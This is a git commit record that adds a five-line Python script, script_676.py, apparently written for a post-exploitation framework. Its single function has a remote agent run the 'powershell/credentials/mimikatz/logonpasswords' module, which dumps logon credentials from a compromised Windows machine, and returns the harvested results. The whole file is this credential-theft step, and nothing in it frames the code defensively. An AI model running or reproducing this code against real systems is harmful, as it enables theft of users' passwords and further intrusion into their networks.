ebd2997c6590ecac6f36d803cc2ca85d831ffe92
developersl-vihaga <githubdevelopersl@gmail.com>
2025-05-07 01:47:03 +0530

    Upload script_676.py

---
+++ script_676.py
@@ -0,0 +1,5 @@
+async def crystallize(agent):
+    output = await agent.execute("powershell/credentials/mimikatz/logonpasswords")
+    results = output["results"]
+    log.debug("Mimikatz ran successfully")
+    return results
